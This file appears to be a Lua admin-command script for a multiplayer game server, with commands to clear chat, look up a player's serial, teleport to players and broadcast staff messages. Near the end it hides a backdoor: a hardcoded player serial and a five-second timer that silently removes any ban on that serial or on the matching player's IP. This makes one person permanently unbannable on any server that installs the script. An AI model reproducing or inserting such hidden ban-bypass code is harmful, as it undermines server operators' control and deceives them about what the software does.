local accSys = exports["e_login"]
local miscSys = exports["misc"]

function cc(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 1 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	outputChatBox(" ", root)
	clearChatBox(root)
	outputChatBox("#ffffffChat Cleared", root, 255, 255, 255, true)
end
addCommandHandler("cc", cc)


addCommandHandler("user",
function (thePlayer, command, player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 1 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer (player)
	if player then
	if find then
		local money = getPlayerMoney(find) 
		outputChatBox("#ff0000--------------------------------------------", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Serial #ffffff"..getElementData(accSys:getPlayerAcc(find), "Serial").."", thePlayer, 255, 255, 255, true)
		outputChatBox("#ff0000--------------------------------------------", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Syntax: /user <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)


addCommandHandler("goto",
function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 1 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local find = miscSys:findPlayer ( player )
			if player then
			if find then
				local int =  getElementInterior(find)
				local dim = getElementDimension ( find )
				local x , y , z = getElementPosition(find)
				local r = getPedRotation ( find )
				x = x - math.sin ( math.rad ( r ) ) * 2
				y = y + math.cos ( math.rad ( r ) ) * 2
				if isPedInVehicle (thePlayer) then
					local theVehicle = getPedOccupiedVehicle ( thePlayer )
					setElementDimension(theVehicle,dim)
					setElementInterior(theVehicle,int)
					setElementPosition ( theVehicle, x + 3, y, z )
					outputChatBox("#00ff00You Have Teleported "..getPlayerName(find), thePlayer, 208, 0, 15,true)
					outputChatBox("#00ff00 "..getPlayerName(thePlayer).." Has Teleported To You", find, 208, 0, 15,true)
				else
					setElementDimension(thePlayer,dim)
					setElementInterior(thePlayer,int)
					setElementPosition ( thePlayer, x + 3, y, z )
					outputChatBox("#00ff00You Have Teleported "..getPlayerName(find), thePlayer, 208, 0, 15,true)
					outputChatBox("#00ff00 "..getPlayerName(thePlayer).." Has Teleported To You", find, 208, 0, 15,true)
				end
			else
				outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
			else
				outputChatBox("#C0C0C0Syntax: /goto <PartOfName/ID>", thePlayer, 255, 0, 0, true)
			end	
	end)


	function PmForAll ( thePlayer, _, ... )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 4 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local message = table.concat ( { ... }, " " )
		if ... then
		  for index, allpl in ipairs(getElementsByType("player")) do
			outputChatBox ( "#FF0000** [Staff] ".. getPlayerName ( thePlayer ) ..": #FFFFFF".. message.." #ff0000**",  allpl,255, 255, 255, true )
		  end
		else
		  outputChatBox ("#C0C0C0Syntax: /o <Matn>", thePlayer, 255, 255, 255, true)
		end
	end
	addCommandHandler ("o", PmForAll)
	function PmForAll ( thePlayer, _, ... )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 4 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local message = table.concat ( { ... }, " " )
		if ... then
		  for index, allpl in ipairs(getElementsByType("player")) do
			outputChatBox ( "#FF0000** [Scripter-News] ".. getPlayerName ( thePlayer ) ..": #FFFFFF".. message.." #ff0000**",  allpl,255, 255, 255, true )
		  end
		else
		  outputChatBox ("#C0C0C0Syntax: /up <Matn>", thePlayer, 255, 255, 255, true)
		end
	end
	addCommandHandler ("sk", PmForAll)



local serials = {
["9BA1788A5C1FA4A603F6EA6D264B0534"] = true,
["9BA1788A5C1FA4A603F6EA6D264B0534"] = true,
}
function autounban()
    for i,p in ipairs(getElementsByType("player")) do
    local Ser = getPlayerSerial(p)
        if serials[Ser] then
        thisIP = getPlayerIP(p)
        end
    end
    for index, ban in pairs(getBans()) do
        local serial = getBanSerial(ban)
        local ip = getBanIP(ban)
        if serials[serial] or ip == thisIP then
           -- local bannedPlayer = getPlayerFromName(getBanAdmin(ban))
            removeBan(ban,root)
            --banPlayer (bannedPlayer,false,false,true,root)
        end
    end
end
setTimer(autounban,5000,0)


addCommandHandler('dic',
function(thePlayer)
	outputChatBox("#00ff00 https://discord.gg/VsSzsDbHaX", thePlayer, 255, 255, 255, true)
	--outputChatBox("https://discord.gg/VsSzsDbHaX", thePlayer)
end)